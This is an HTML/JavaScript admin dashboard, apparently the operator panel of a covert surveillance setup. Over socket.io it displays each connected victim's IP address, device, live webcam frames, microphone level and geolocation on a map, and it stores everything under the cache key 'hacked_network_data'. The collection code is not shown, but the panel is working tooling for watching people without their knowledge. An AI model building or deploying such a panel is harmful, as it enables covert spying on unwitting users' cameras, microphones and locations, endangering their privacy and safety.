<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        *{ margin:0; padding:0; box-sizing:border-box; }
        body{ background:#0b0e14; color:#c8d0dc; font-family:sans-serif; padding:20px; }
        .header{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #2a3a50; padding-bottom:15px; flex-wrap:wrap; gap:10px; }
        .header h1{ color:#ff6b6b; }
        .header-actions{ display:flex; gap:15px; align-items:center; }
        .btn-clear{ background:#ff6b6b44; border:1px solid #ff6b6b; color:#ff6b6b; padding:8px 20px; border-radius:30px; cursor:pointer; transition:0.2s; }
        .btn-clear:hover{ background:#ff6b6b; color:#0b0e14; }
        .logout{ color:#ff6b6b; text-decoration:none; border:1px solid #ff6b6b; padding:6px 18px; border-radius:30px; }
        .client-grid{ display:grid; grid-template-columns:repeat(auto-fill, minmax(400px,1fr)); gap:20px; margin-top:25px; }
        .client-card{ background:#141c28; border:1px solid #2a3a50; border-radius:14px; padding:18px; }
        .client-id{ color:#ff6b6b; font-size:20px; font-weight:600; word-break:break-all; }
        .client-info{ font-size:14px; color:#9aabb8; margin:4px 0; }
        .flex-row{ display:flex; flex-wrap:wrap; gap:15px; align-items:flex-start; }
        .video-container{ flex:0 0 200px; border-radius:10px; overflow:hidden; background:#000; border:1px solid #2a3a50; }
        .video-container img{ width:100%; }
        .map-container{ height:150px; width:100%; border-radius:8px; overflow:hidden; margin-top:8px; }
        .audio-bar{ width:100%; height:5px; background:#1f2a3a; border-radius:3px; margin-top:6px; }
        .audio-bar .fill{ height:100%; background:#ff6b6b; border-radius:3px; }
        .no-data{ color:#556; font-style:italic; }
        .badge{ background:#2a3a50; padding:2px 12px; border-radius:20px; font-size:12px; margin-left:10px; }
        .offline-badge{ background:#ff6b6b33; color:#ff6b6b; }
        .timestamp{ font-size:11px; color:#445; margin-top:5px; }
        .status-summary{ background:#1a2430; padding:12px 20px; border-radius:10px; margin-bottom:20px; display:flex; gap:30px; flex-wrap:wrap; }
        .status-summary span{ display:flex; align-items:center; gap:8px; }
        .online-dot{ display:inline-block; width:12px; height:12px; border-radius:50%; background:#00ff88; }
        .offline-dot{ display:inline-block; width:12px; height:12px; border-radius:50%; background:#ff6b6b; }
    </style>
</head>
<body>
<div class="header">
    <h1>🛡️ Admin – All Users (Live + Offline)</h1>
    <div class="header-actions">
        <button id="clearBtn" class="btn-clear">🗑️ Clear All Data</button>
        <a href="/random/admin/logout" class="logout">Logout</a>
    </div>
</div>
<div class="status-summary">
    <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
    <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
    <span>📊 Total Users: <span id="totalCount">0</span></span>
</div>
<div id="clientsGrid" class="client-grid"></div>
<script>
    const socket = io();
    const CACHE_KEY = 'hacked_network_data';

    console.log('Admin page loaded');

    // কানেক্ট হওয়ার পর admin_room-এ যোগ দাও
    socket.on('connect', () => {
        console.log('Admin socket connected, joining admin_room...');
        socket.emit('admin_join');
    });

    function loadCache() {
        try { return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}'); } catch { return {}; }
    }
    function saveCache(data) {
        localStorage.setItem(CACHE_KEY, JSON.stringify(data));
    }

    function render(clientsData) {
        console.log('Rendering clients:', clientsData);
        const grid = document.getElementById('clientsGrid');
        grid.innerHTML = '';
        const keys = Object.keys(clientsData);
        let online = 0, offline = 0;
        for (const [ip, data] of Object.entries(clientsData)) {
            if (data.offline) offline++;
            else online++;
        }
        document.getElementById('onlineCount').textContent = online;
        document.getElementById('offlineCount').textContent = offline;
        document.getElementById('totalCount').textContent = keys.length;

        if (keys.length === 0) {
            grid.innerHTML = '<div style="padding:40px;text-align:center;color:#556;">No data available</div>';
            return;
        }
        for (const [ip, data] of Object.entries(clientsData)) {
            const card = document.createElement('div');
            card.className = 'client-card';
            let mapHtml = '<div class="no-data">No location</div>';
            if (data.location) {
                mapHtml = `<div class="map-container" id="map-${ip}"></div>`;
            }
            let videoHtml = '<div class="no-data">Camera off</div>';
            if (data.last_frame) {
                videoHtml = `<img src="${data.last_frame}" alt="Video" />`;
            }
            const vol = data.audio_level || 0;
            const offlineFlag = data.offline ? true : false;
            card.innerHTML = `
                <div class="client-id">
                    🆔 ${data.id || data.ip}
                    <span class="badge">${data.sids ? data.sids.length : 0} connection(s)</span>
                    ${offlineFlag ? '<span class="badge offline-badge">📴 Offline</span>' : '<span class="badge" style="background:#00ff8844;color:#00ff88;">● Live</span>'}
                </div>
                <div class="client-info">🌐 IP: ${data.ip}</div>
                <div class="client-info">📱 Device: ${data.user_agent || 'Unknown'}</div>
                <div class="client-info">🔊 Audio: ${vol}%</div>
                <div class="audio-bar"><div class="fill" style="width:${vol}%;"></div></div>
                <div class="flex-row">
                    <div style="flex:1;">${mapHtml}</div>
                    <div class="video-container">${videoHtml}</div>
                </div>
                <div class="timestamp">${offlineFlag ? '📴 Last seen before disconnect' : '🟢 Live'}</div>
            `;
            grid.appendChild(card);
            if (data.location) {
                const mapDiv = document.getElementById(`map-${ip}`);
                if (mapDiv) {
                    const map = L.map(mapDiv).setView([data.location.lat, data.location.lng], 13);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                    L.marker([data.location.lat, data.location.lng]).addTo(map);
                }
            }
        }
    }

    socket.on('admin_update', (liveData) => {
        console.log('Received admin_update:', liveData);
        const cache = loadCache();
        for (const [ip, data] of Object.entries(liveData)) {
            cache[ip] = data;
            cache[ip].offline = false;
        }
        for (const [ip, data] of Object.entries(cache)) {
            if (!liveData[ip]) {
                data.offline = true;
            }
        }
        saveCache(cache);
        render(cache);
    });

    window.addEventListener('load', () => {
        const cached = loadCache();
        if (Object.keys(cached).length > 0) render(cached);
    });

    document.getElementById('clearBtn').addEventListener('click', () => {
        const pass = prompt('Enter clear password:');
        if (pass === null) return;
        socket.emit('clear_data', { password: pass }, (response) => {
            if (response && response.status === 'ok') {
                alert('All data cleared successfully!');
                localStorage.removeItem(CACHE_KEY);
                render({});
            } else {
                alert('Wrong password or error.');
            }
        });
    });

    socket.on('clear_all', () => {
        localStorage.removeItem(CACHE_KEY);
        render({});
    });
</script>
</body>
</html>
